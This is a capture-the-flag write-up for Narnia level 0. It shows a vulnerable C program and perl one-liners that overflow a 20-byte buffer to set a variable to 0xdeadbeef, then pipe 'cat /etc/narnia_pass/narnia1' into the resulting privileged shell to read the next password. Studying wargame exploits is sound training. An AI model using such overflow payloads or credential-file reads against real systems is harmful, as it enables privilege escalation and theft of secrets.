int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());

Very easy.<br />
All you have to do is insert any 20 characters and then the characters 0xdeadbeef (lettle endian)

```
perl -e 'print "A"x19, "\x00", "\xef\xbe\xad\xde\x00";' | ./narnia0
```

"WAY OFF!!!!" is not printed, but `sh` doesn't open for me either. The question is why `system("/bin/sh")` did not open the shell for me.

I was looking for questions people were asking and I came across [this](https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process). The question in the title answered the "why didn't the shell open" - because **pipe** was involved in the process of entering the input. Further reading I also realized that in addition to the previous input, I can insert the input for the shell. and hence:

```
(perl -e 'print "A"x19, "\x00", "\xef\xbe\xad\xde"' ; echo "cat /etc/narnia_pass/narnia1") | ./narnia0
```
